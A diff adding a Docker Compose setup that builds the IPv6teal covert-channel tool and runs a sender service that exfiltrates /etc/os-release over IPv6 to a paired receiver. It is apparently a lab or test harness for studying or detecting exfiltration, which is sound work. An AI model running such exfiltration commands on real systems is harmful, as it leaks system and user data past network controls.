@@ -1,0 +1,23 @@
+include:
+  - ../base.yml
+
+services:
+  receiver:
+    command: python receive.py ./out
+    network_mode: service:receiver_base
+    stop_grace_period: 1s
+    build:
+      dockerfile_inline: |
+        FROM python:3.7
+        RUN git clone https://github.com/christophetd/IPv6teal.git
+        WORKDIR IPv6teal
+        RUN ln -sf /usr/lib/x86_64-linux-gnu/libc.a /usr/lib/x86_64-linux-gnu/liblibc.a
+        RUN apt update && apt install -y libpcap-dev tcpdump
+        RUN pip install -r requirements.txt
+
+  sender:
+    extends: receiver
+    depends_on:
+      - receiver
+    network_mode: service:sender_base
+    command: python exfiltrate.py /etc/os-release 8888::8
